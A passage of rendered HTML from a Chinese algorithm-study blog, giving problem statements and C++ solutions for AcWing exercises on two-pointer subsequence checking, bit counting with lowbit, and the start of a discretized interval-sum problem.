separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_1,a_2,…,a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p>第三行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 个整数，表示 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>b</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>b</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">b_1,b_2,…,b_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p><strong>输出格式</strong></p><p>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 序列是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> 序列的子序列，输出一行 <code>Yes</code>。</p><p>否则，输出 <code>No</code>。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mi>m</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le n \le m \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>≤</mo><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>b</mi><mi>i</mi></msub><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le a_i,b_i \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>3 51 3 51 2 3 4 5</code></pre><p><strong>输出样例：</strong></p><pre><code>Yes</code></pre><h3 id="双指针-2">双指针</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], b[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i &lt; n &amp;&amp; j &lt; m) &#123;</span><br><span class="line">    <span class="keyword">if</span> (a[i] == b[j]) i++;</span><br><span class="line">    j++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (i == n) &#123;  <span class="comment">// 看短的</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="位运算">位运算</h1><h2 id="AcWing-801-二进制中1的个数"><a href="https://www.acwing.com/problem/content/803/">AcWing 801. 二进制中1的个数</a></h2><p>给定一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的数列，请你求出数列中每个数的二进制表示中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 的个数。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，表示整个数列。</p><p><strong>输出格式</strong></p><p>共一行，包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，其中的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个数表示数列中的第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个数的二进制表示中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 的个数。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mtext>数列中元素的值</mtext><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">0 \le 数列中元素的值 \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">数列中元素的值</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>51 2 3 4 5</code></pre><p><strong>输出样例：</strong></p><pre><code>1 1 2 1 2</code></pre><h3 id="lowbit-x-x-x">lowbit(x) = x &amp; -x</h3><p>题型: lowbit(x)返回x的最后一位1, 比如lowbit(20)=lowbit(10100_2)=100<br>方法: <code>x &amp; -x</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x) &#123;</span><br><span class="line">      x -= x &amp; -x;</span><br><span class="line">      res++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, res);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="离散化">离散化</h1><h2 id="AcWing-802-区间和"><a href="https://www.acwing.com/problem/content/804/">AcWing 802. 区间和</a></h2><p>假定有一个无限长的数轴，数轴上每个坐标上的数都是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>。</p><p>现在，我们首先进行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 次操作，每次操作将某一位置 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 上的数加 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span>。</p><p>接下来，进行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 次询问，每个询问包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>，你需要求出在区间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>l</mi><mo separator="true">,</mo><mi>r</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[l, r]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mclose">]</span></span></span></span> 之间的所有数的和。</p><p><strong>输入格式</strong></p><p>第一行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 行，每行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span>。</p><p>再接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 行，每行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 行，每行输出一个询问中所求的区间内数字和。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>≤</mo><mi>x</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le x \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le n,m \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>≤</mo><mi>l</mi><mo>≤</mo><mi>r</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le l \le r \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span 